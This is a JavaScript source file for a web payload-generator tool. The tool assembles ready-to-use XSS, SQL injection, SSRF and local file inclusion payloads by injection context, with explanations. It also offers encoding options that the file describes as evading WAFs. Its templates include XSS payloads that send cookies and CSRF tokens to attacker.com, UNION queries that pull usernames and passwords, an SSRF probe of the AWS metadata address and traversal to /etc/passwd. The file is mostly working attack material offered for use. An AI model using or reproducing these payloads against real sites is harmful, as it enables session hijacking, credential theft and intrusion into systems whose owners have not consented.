// ==========================================
// PAYLOAD GENERATOR ENGINE
// ==========================================

const VulnData = {
  xss: {
    contexts: [
      { id: 'html_body', label: 'HTML Body (e.g. <div>[here]</div>)' },
      { id: 'attribute_dq', label: 'Attribute - Double Quotes (e.g. value="[here]")' },
      { id: 'attribute_sq', label: 'Attribute - Single Quotes (e.g. value=\'[here]\')' },
      { id: 'script_string', label: 'Inside <script> String (e.g. var x = "[here]";)' }
    ],
    actions: [
      { id: 'alert', label: 'Alert Popup (Proof of Concept)' },
      { id: 'cookie_steal', label: 'Steal Cookies' },
      { id: 'dom_read', label: 'Read DOM / CSRF Token' }
    ]
  },
  sqli: {
    contexts: [
      { id: 'int', label: 'Integer (e.g. id=[here])' },
      { id: 'string_dq', label: 'String - Double Quotes (e.g. name="[here]")' },
      { id: 'string_sq', label: 'String - Single Quotes (e.g. name=\'[here]\')' }
    ],
    actions: [
      { id: 'auth_bypass', label: 'Authentication Bypass (OR 1=1)' },
      { id: 'union_extract', label: 'UNION Data Extraction' },
      { id: 'time_delay', label: 'Time-Based Delay (SLEEP)' }
    ]
  },
  ssrf: {
    contexts: [
      { id: 'url_param', label: 'Full URL Parameter (e.g. ?url=[here])' },
      { id: 'path_append', label: 'Path Append (e.g. api.com/[here])' }
    ],
    actions: [
      { id: 'aws_metadata', label: 'AWS Metadata Exfiltration' },
      { id: 'localhost_port', label: 'Localhost Port Scan' }
    ]
  },
  lfi: {
    contexts: [
      { id: 'direct_file', label: 'Direct File Inclusion (e.g. ?file=[here])' },
      { id: 'path_traversal', label: 'Path Traversal (e.g. ?file=folder/[here])' }
    ],
    actions: [
      { id: 'read_passwd', label: 'Read /etc/passwd' },
      { id: 'read_win_ini', label: 'Read C:\\Windows\\win.ini' }
    ]
  }
};

const PayloadTemplates = {
  xss: {
    alert: {
      html_body: { code: "<script>alert(document.domain)</script>", desc: "Direct injection of a script tag. Works when input is reflected directly into the HTML body without tag sanitization." },
      attribute_dq: { code: "\"><script>alert(document.domain)</script>", desc: "Breaks out of the double-quote attribute using `\">` and then injects a script tag." },
      attribute_sq: { code: "'><script>alert(document.domain)</script>", desc: "Breaks out of the single-quote attribute using `'>` and then injects a script tag." },
      script_string: { code: "\"; alert(document.domain); //", desc: "Breaks out of the JavaScript string using `\";`, injects the alert, and comments out the rest of the line with `//`." }
    },
    cookie_steal: {
      html_body: { code: "<img src=x onerror=\"fetch('https://attacker.com/log?c='+document.cookie)\">", desc: "Uses an image tag with an invalid source to trigger the `onerror` event, which sends the victim's cookies to the attacker." },
      attribute_dq: { code: "\" autofocus onfocus=\"fetch('https://attacker.com/log?c='+document.cookie)\"", desc: "Breaks out and injects HTML5 `autofocus` with `onfocus` event handler to execute JS without user interaction." },
      attribute_sq: { code: "' autofocus onfocus='fetch(`https://attacker.com/log?c=`+document.cookie)'", desc: "Same as above but breaking out of single quotes." },
      script_string: { code: "\"; fetch('https://attacker.com/log?c='+document.cookie); //", desc: "Breaks JS string and executes the fetch request directly in the script block." }
    },
    dom_read: {
      html_body: { code: "<script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>", desc: "Reads a CSRF token from the DOM and sends it to the attacker." },
      attribute_dq: { code: "\"><script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>", desc: "Breaks attribute and reads CSRF token." },
      attribute_sq: { code: "'><script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>", desc: "Breaks attribute and reads CSRF token." },
      script_string: { code: "\"; fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content); //", desc: "Breaks JS string and reads CSRF token." }
    }
  },
  sqli: {
    auth_bypass: {
      int: { code: "1 OR 1=1", desc: "Modifies the WHERE clause to evaluate to TRUE. Since 1=1 is always true, it bypasses the check." },
      string_dq: { code: "\" OR \"1\"=\"1", desc: "Closes the double quote string and appends a tautology." },
      string_sq: { code: "' OR '1'='1", desc: "Closes the single quote string and appends a tautology. Classic authentication bypass." }
    },
    union_extract: {
      int: { code: "-1 UNION SELECT username, password FROM users-- -", desc: "Uses -1 to make the first query empty, then appends the results of a second query using UNION." },
      string_dq: { code: "\" UNION SELECT username, password FROM users-- -", desc: "Closes double quotes and uses UNION to extract data." },
      string_sq: { code: "' UNION SELECT username, password FROM users-- -", desc: "Closes single quotes and uses UNION to extract data." }
    },
    time_delay: {
      int: { code: "1; WAITFOR DELAY '0:0:5'--", desc: "SQL Server time delay payload. Appends a command to wait 5 seconds." },
      string_dq: { code: "\"; WAITFOR DELAY '0:0:5'--", desc: "Breaks out of string and injects time delay." },
      string_sq: { code: "'; WAITFOR DELAY '0:0:5'--", desc: "Breaks out of string and injects time delay." }
    }
  },
  ssrf: {
    aws_metadata: {
      url_param: { code: "http://169.254.169.254/latest/meta-data/", desc: "Directly requests the AWS EC2 metadata IP address." },
      path_append: { code: "@169.254.169.254/latest/meta-data/", desc: "Uses the @ symbol to treat the preceding URL as credentials, resolving the request to the metadata IP." }
    },
    localhost_port: {
      url_param: { code: "http://127.0.0.1:22", desc: "Requests port 22 on localhost to check for open SSH." },
      path_append: { code: "@127.0.0.1:22", desc: "Uses @ to redirect the internal request to localhost port 22." }
    }
  },
  lfi: {
    read_passwd: {
      direct_file: { code: "/etc/passwd", desc: "Direct absolute path to read the Linux password file." },
      path_traversal: { code: "../../../../../../../../../etc/passwd", desc: "Uses multiple `../` to traverse up to the root directory, then accesses /etc/passwd." }
    },
    read_win_ini: {
      direct_file: { code: "C:\\Windows\\win.ini", desc: "Absolute path for Windows systems." },
      path_traversal: { code: "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini", desc: "Windows path traversal using backslashes." }
    }
  }
};

document.addEventListener("DOMContentLoaded", () => {
  const vulnClassEl = document.getElementById("vuln-class");
  const contextEl = document.getElementById("vuln-context");
  const actionEl = document.getElementById("vuln-action");
  const filterEl = document.getElementById("vuln-filter");
  const btnGenerate = document.getElementById("btn-generate");
  const btnCopy = document.getElementById("btn-copy");
  const outputCode = document.getElementById("output-code");
  const outputExplanation = document.getElementById("output-explanation");

  function populateDropdowns() {
    const vClass = vulnClassEl.value;
    const data = VulnData[vClass];

    // Populate Contexts
    contextEl.innerHTML = "";
    data.contexts.forEach(ctx => {
      const opt = document.createElement("option");
      opt.value = ctx.id;
      opt.textContent = ctx.label;
      contextEl.appendChild(opt);
    });

    // Populate Actions
    actionEl.innerHTML = "";
    data.actions.forEach(act => {
      const opt = document.createElement("option");
      opt.value = act.id;
      opt.textContent = act.label;
      actionEl.appendChild(opt);
    });
  }

  vulnClassEl.addEventListener("change", populateDropdowns);
  populateDropdowns(); // Init

  function applyFilter(code, filterType) {
    if (filterType === "urlencode") {
      return encodeURIComponent(code);
    } else if (filterType === "doubleurlencode") {
      return encodeURIComponent(encodeURIComponent(code));
    } else if (filterType === "base64") {
      return btoa(unescape(encodeURIComponent(code)));
    }
    return code; // none
  }

  function getFilterExplanation(filterType) {
    if (filterType === "urlencode") {
      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (URL Encode):</strong> The payload is URL encoded to bypass basic WAFs that inspect raw HTTP requests. The backend server will decode this before processing.";
    } else if (filterType === "doubleurlencode") {
      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (Double URL Encode):</strong> Useful when the application decodes the input twice. The WAF sees valid characters and lets it pass, while the backend decodes it into the malicious payload.";
    } else if (filterType === "base64") {
      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (Base64):</strong> The payload is Base64 encoded. This is useful if the application explicitly expects Base64 input and decodes it before executing (e.g. in JSON parameters or deserialization).";
    }
    return "";
  }

  btnGenerate.addEventListener("click", () => {
    const vClass = vulnClassEl.value;
    const vContext = contextEl.value;
    const vAction = actionEl.value;
    const vFilter = filterEl.value;

    let payloadData = null;
    try {
      payloadData = PayloadTemplates[vClass][vAction][vContext];
    } catch(e) {}

    if (payloadData) {
      const finalCode = applyFilter(payloadData.code, vFilter);
      outputCode.textContent = finalCode;
      outputExplanation.innerHTML = payloadData.desc + getFilterExplanation(vFilter);
      
      // Animation effect
      outputCode.parentElement.style.transform = "scale(0.98)";
      setTimeout(() => outputCode.parentElement.style.transform = "scale(1)", 150);
    } else {
      outputCode.textContent = "Error: Payload combination not found.";
      outputExplanation.textContent = "Please select different parameters.";
    }
  });

  btnCopy.addEventListener("click", () => {
    const textToCopy = outputCode.textContent;
    if (textToCopy && textToCopy !== "// Select options and click Generate...") {
      navigator.clipboard.writeText(textToCopy).then(() => {
        const originalText = btnCopy.innerHTML;
        btnCopy.innerHTML = "<i class='bx bx-check'></i> Copied!";
        btnCopy.style.color = "var(--accent-green)";
        setTimeout(() => {
          btnCopy.innerHTML = originalText;
          btnCopy.style.color = "var(--text-secondary)";
        }, 2000);
      });
    }
  });
});
